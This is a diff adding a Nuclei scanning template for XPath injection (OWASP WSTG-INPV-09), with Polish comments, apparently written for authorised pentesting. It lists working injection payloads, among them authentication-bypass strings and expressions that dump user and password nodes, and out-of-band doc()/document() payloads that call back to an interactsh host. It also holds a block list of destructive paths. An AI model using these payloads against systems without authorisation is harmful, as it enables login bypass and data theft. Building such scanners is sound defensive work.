@@ -1,0 +1,256 @@
+# ============================================================================
+# WSTG-INPV-09: XPath Injection (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (XPath). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ Boolean injection (or 1=1, or 'a'='a')
+#   ✓ Comment injection (XPath nie ma natywnych comments, ale string break)
+#   ✓ XPath 1.0 + XPath 2.0/3.0 specifics
+#   ✓ XQuery extension (gdy XQuery zamiast XPath)
+#   ✓ Authentication bypass classics
+#   ✓ Universal wildcard
+#
+# Performance budget: low-medium (~80 payloads)
+# Estimated time: ~5-10 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/XPATH Injection/*
+#   2. hacktricks/.../xpath-injection
+# ============================================================================
+
+id: wstg-inpv-09-xpath-injection
+
+info:
+  name: "WSTG-INPV-09: XPath Injection (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa XPath Injection przez wstrzykiwanie operatorów logicznych (or/and),
+    znaków łamiących składnię (', ", [, ], //, *) oraz typowych payloadów
+    auth bypass. Detekcja przez XPath parser errors lub differential.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/xpath-injection
+  classification:
+    cwe-id: CWE-643
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: dast,wstg,wstg-v42-inpv-09,xpath-injection,asvs-v5.3.7,burp-history
+
+variables:
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Single-character syntax break
+        # ====================================================================
+        - "'"
+        - "\""
+        - "["
+        - "]"
+        - "//"
+        - "::"
+        - "*"
+        - "("
+        - ")"
+
+        # ====================================================================
+        # GROUP 2: Authentication bypass classics
+        # ====================================================================
+        - "' or '1'='1"
+        - "' or 1=1 or '"
+        - "' or '1'='1"
+        - "\" or \"1\"=\"1"
+        - "' or 'a'='a"
+        - "\" or \"a\"=\"a"
+        - "' or '' = '"
+        - "' or 1=1]"
+        - "x' or 1=1 or 'x'='y"
+        - "' or position()=1 or '"
+        - "' or last()=1 or '"
+        - "admin' or '1'='1"
+        - "' or true() or '"
+
+        # ====================================================================
+        # GROUP 3: XPath operators / functions
+        # ====================================================================
+        - "' or count(//*)=count(//*) or '"
+        - "'] | //* | a[a='"
+        - "'] | a[ '"
+        - "'] | //* | a[a='"
+        - "' and count(/)=1 and '"
+        - "' and 1=1 and '"
+        - "' and 1=2 and '"
+        - "' and string-length(name(/*[1]))=1 and '"
+
+        # ====================================================================
+        # GROUP 4: Universal break + return all
+        # ====================================================================
+        - "*"
+        - "*[1]"
+        - "*[*]"
+        - "//*"
+        - "//user"
+        - "//user[1]"
+        - "//user[*]"
+        - "/*/*"
+        - "*//*"
+
+        # ====================================================================
+        # GROUP 5: XQuery / XPath 2.0/3.0 specifics
+        # ====================================================================
+        - "'; doc('http://{{interactsh-url}}/{{rand_text_alpha(5)}}'); '"
+        - "string-join(//user/password, ',')"
+        - "'/0+0"
+        # XQuery
+        - "let $x := //user return $x"
+
+        # ====================================================================
+        # GROUP 6: Encoded variants
+        # ====================================================================
+        - "%27%20or%20%271%27%3D%271"
+        - "%27%20or%201%3D1%20or%20%27"
+        - "%2527%2520or%2520%25271%2527%253D%25271"
+
+        # ====================================================================
+        # GROUP 7: Combinatorial
+        # ====================================================================
+        - "' or count(//*)>0 or '"
+        - "'] | (//*) | a['"
+        - "x' or true() or 'a'='a"
+        - "' or contains(//user/username,'a') or '"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - XPath parser errors
+      - type: regex
+        part: body
+        name: xpath-error
+        regex:
+          - "(?i)XPathException"
+          - "(?i)System\\.Xml\\.XPath\\."
+          - "(?i)javax\\.xml\\.xpath"
+          - "(?i)org\\.dom4j\\.XPathSyntaxError"
+          - "(?i)MS\\.Internal\\.Xml"
+          - "(?i)A closing bracket expected"
+          - "(?i)Expression must evaluate to a node-set"
+          - "(?i)Invalid XPath expression"
+          - "(?i)XPath syntax error"
+          - "(?i)XPathSyntaxException"
+          - "(?i)unexpected token"
+          - "(?i)Expected node test or name test"
+          - "(?i)A node test that matches either NCName"
+          - "(?i)libxml.*?XPath"
+          - "(?i)XQueryException"
+          - "(?i)XPathParser"
+          # PHP simplexml
+          - "(?i)Warning.*?\\Wsimplexml_"
+          - "(?i)simplexml_load_string"
+          # Generic XML parsing errors
+          - "(?i)error.*XPath.*expression"
+        condition: or
+
+      # Warstwa 2: SECONDARY
+      - type: dsl
+        dsl:
+          - "len(body) > 30"
+
+      # Warstwa 3: ANTI-FP
+      - type: dsl
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      - type: dsl
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: regex
+        name: xpath-error-snippet
+        part: body
+        regex:
+          - "(?i)(XPathException|XPathSyntaxError|Invalid XPath|XPath syntax error).{0,200}"
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind XPath via OOB - doc()/document() functions
+  # XPath 2.0+ (Saxon, XQuery) wspiera doc()/document() które ładują
+  # external resource. Callback do interactsh = parser wspiera external doc.
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      xpath_oob:
+        - "' and doc('http://{{interactsh-url}}/{{canary}}') or '1'='1"
+        - "' and document('http://{{interactsh-url}}/{{canary}}') or '1'='1"
+        - "'+doc('http://{{interactsh-url}}/{{canary}}')+'"
+        - "/*[contains(doc('http://{{interactsh-url}}/{{canary}}'),'')]"
+        # Saxon-specific httpclient
+        - "' and saxon:http-request('http://{{interactsh-url}}/{{canary}}') or '1'='1"
+
+    fuzzing:
+      - parts: [query, body, cookie, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{url_encode(xpath_oob)}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Blind XPath (bez error message) wymaga differential boolean analysis -
+#   nie pokryte w MVP
+# - XPath 1.0 vs 2.0 syntax różnice mogą generować FN dla niektórych payloadów
+# ============================================================================
